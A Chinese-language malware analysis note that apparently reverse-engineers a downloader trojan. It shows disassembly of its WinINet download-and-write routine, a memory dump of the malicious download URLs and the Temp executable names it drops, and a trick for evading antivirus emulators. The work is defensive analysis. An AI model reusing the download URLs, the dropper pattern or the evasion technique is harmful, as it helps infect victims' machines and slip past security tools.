
## 反汇编代码片段

```
00401406    6A 04            push 4  

00401408    8945 08         mov dword ptr ss:[ebp+8],eax  

0040140B    8D45 E0         lea eax,dword ptr ss:[ebp-20]  

0040140E    50              push eax  

0040140F    6A 02           push 2  

00401411    FF75 F4         push dword ptr ss:[ebp-C]  

00401414    FF15 EC304000   call dword ptr ds:[4030EC]                 ; WININET.InternetSetOptionA  

0040141A    6A 04           push 4  

0040141C    8D45 E0         lea eax,dword ptr ss:[ebp-20]  

0040141F    50              push eax  

00401420    6A 06           push 6  

00401422    FF75 F4         push dword ptr ss:[ebp-C]  

00401425    FF15 EC304000   call dword ptr ds:[4030EC]                 ; WININET.InternetSetOptionA  

0040142B    6A 04           push 4  

0040142D    8D45 E0         lea eax,dword ptr ss:[ebp-20]  

00401430    50              push eax  

00401431    6A 05           push 5  

00401433    FF75 F4         push dword ptr ss:[ebp-C]  

00401436    FF15 EC304000   call dword ptr ds:[4030EC]                 ; WININET.InternetSetOptionA  

0040143C    53              push ebx  

0040143D    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

00401440    50              push eax  

00401441    8D45 EC         lea eax,dword ptr ss:[ebp-14]  

00401444    50              push eax  

00401445    68 05000020     push 20000005  

0040144A    FF75 08         push dword ptr ss:[ebp+8]  

0040144D    895D EC         mov dword ptr ss:[ebp-14],ebx  

00401450    C745 FC 0400000>mov dword ptr ss:[ebp-4],4  

00401457    FF15 F0304000   call dword ptr ds:[<&comdlg32.GetFileTit]; WININET.HttpQueryInfoA  

0040145D    8B45 EC         mov eax,dword ptr ss:[ebp-14]  

00401460    3BC6            cmp eax,esi  

00401462    0F86 8C000000   jbe __krap_.004014F4  

00401468    53              push ebx  

00401469    68 80000000     push 80  

0040146E    6A 04           push 4  

00401470    53              push ebx  

00401471    6A 02           push 2  

00401473    68 00000040     push 40000000  

00401478    8D85 08FFFFFF   lea eax,dword ptr ss:[ebp-F8]  

0040147E    50              push eax  

0040147F    FF15 4C304000   call dword ptr ds:[40304C]                 ; kernel32.CreateFileA  

00401485    56              push esi  

00401486    8945 F0         mov dword ptr ss:[ebp-10],eax  

00401489    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

0040148F    53              push ebx  

00401490    50              push eax  

00401491    895D FC         mov dword ptr ss:[ebp-4],ebx  

00401494    E8 0E080000     call __krap_.00401CA7  

00401499    EB 2D           jmp short __krap_.004014C8  

0040149B    3AC3            cmp al,bl  

0040149D    74 4A           je short __krap_.004014E9  

0040149F    53              push ebx  

004014A0    8D45 DC         lea eax,dword ptr ss:[ebp-24]  

004014A3    50              push eax  

004014A4    FF75 FC         push dword ptr ss:[ebp-4]  

004014A7    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

004014AD    50              push eax  

004014AE    FF75 F0         push dword ptr ss:[ebp-10]  

004014B1    FF15 48304000   call dword ptr ds:[403048]                 ; kernel32.WriteFile  

004014B7    56              push esi  

004014B8    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

004014BE    53              push ebx  

004014BF    50              push eax  

004014C0    E8 E2070000     call __krap_.00401CA7  

004014C5    895D FC         mov dword ptr ss:[ebp-4],ebx  

004014C8    83C4 0C         add esp,0C  

004014CB    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

004014CE    50              push eax  

004014CF    56              push esi  

004014D0    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

004014D6    50              push eax  

004014D7    FF75 08         push dword ptr ss:[ebp+8]  

004014DA    8975 E8         mov dword ptr ss:[ebp-18],esi  

004014DD    FFD7            call edi  

004014DF    85C0            test eax,eax  

004014E1    0F95C0          setne al  

004014E4    395D FC         cmp dword ptr ss:[ebp-4],ebx  

004014E7    77 B2           ja short __krap_.0040149B  

004014E9    FF75 F0         push dword ptr ss:[ebp-10]  

004014EC    FF15 2C304000   call dword ptr ds:[40302C]                 ; kernel32.CloseHandle  

004014F2    EB 13           jmp short __krap_.00401507  

004014F4    83C0 FE         add eax,-2  

004014F7    3D FE030000     cmp eax,3FE  

004014FC    77 09           ja short __krap_.00401507  

004014FE    885D FB         mov byte ptr ss:[ebp-5],bl  

00401501    EB 04           jmp short __krap_.00401507  

00401503    3AC3            cmp al,bl  

00401505    74 1B           je short __krap_.00401522  

00401507    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

0040150A    50              push eax  

0040150B    56              push esi  

0040150C    8D85 08FAFFFF   lea eax,dword ptr ss:[ebp-5F8]  

00401512    50              push eax  

00401513    FF75 08         push dword ptr ss:[ebp+8]  

00401516    FFD7            call edi  
```

## 关联网络及下载病毒列表

链接的网络及下载的要运行的病毒包括不限于下面这些：

```
0012E584   0012E834  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\nvdwyuf.exe"  

0012E590   0012E7B4  ASCII "http://dbcorps.com/ibemh/oovqlsahc.php?adv=adv468"   

0012E59C   0012E734  ASCII "http://cbphase.com/ibemh/oovqlsahc.php?adv=adv468" 

0012E584   0012E9B4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\rrtmxa.exe"

0012E584   0012EB34  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\hrbnufy.exe" 

0012E590   0012EAB4  ASCII "http://dbcorps.com/ibemh/rhlgoidbwq.php?adv=adv468"    

0012E584   0012ECB4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\qgrirjoc.exe" 

0012E590   0012EC34  ASCII "http://dbcorps.com/ibemh/erztbwqyg.php?adv=adv468"   

0012E584   0012EE34  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\wsxguopp.exe"

0012E590   0012EDB4  ASCII "http://dbcorps.com/ibemh/aaick.php?adv=adv468" 

0012E584   0012EFB4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\edsycb.exe" 

0012E590   0012EF34  ASCII "http://dbcorps.com/ibemh/xbsnusnvp.php?adv=adv468" 

0012E584   0012F134  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\nped.exe"   

0012E59C   0012F034  ASCII "http://cbphase.com/ibemh/cfjeyt.php?adv=adv468" 

0012E584   0012F2B4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\njnosbp.exe"   

0012E59C   0012F1B4  ASCII "http://cbphase.com/ibemh/imdysnucxe.php?adv=adv468" 

0012E584   0012F434  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\eqyleiv.exe"    

0012E59C   0012F334  ASCII "http://cbphase.com/ibemh/gtbwqys.php?adv=adv468" 

0012E584   0012F5B4  ASCII "C:\\DOCUME~1\\ADMIN~1\\LOCALS~1\\Temp\\gbrel.exe"
```

...

## 绕过 AVer 虚拟机代码

里面还使用了一些绕 AVer 虚拟机的代码：

```
0014101A    6A 00           push 0  

0014101C    8D45 FC         lea eax,dword ptr ss:[ebp-4]  

0014101F    50              push eax  

00141020    6A 01           push 1  

00141022    E8 37110000     call 0014215E          // call ddraw.DirectDrawCreate，没仿真这个就挂了 :(  

00141027    85C0            test eax,eax  

00141029    74 04           je short 0014102F  

0014102B    33C0            xor eax,eax  

0014102D    C9              leave  

0014102E    C3              retn  

0014102F    8B45 FC         mov eax,dword ptr ss:[ebp-4]  

00141032    8B08            mov ecx,dword ptr ds:[eax]  
```

在上面这些代码执行完毕后进行自删除。
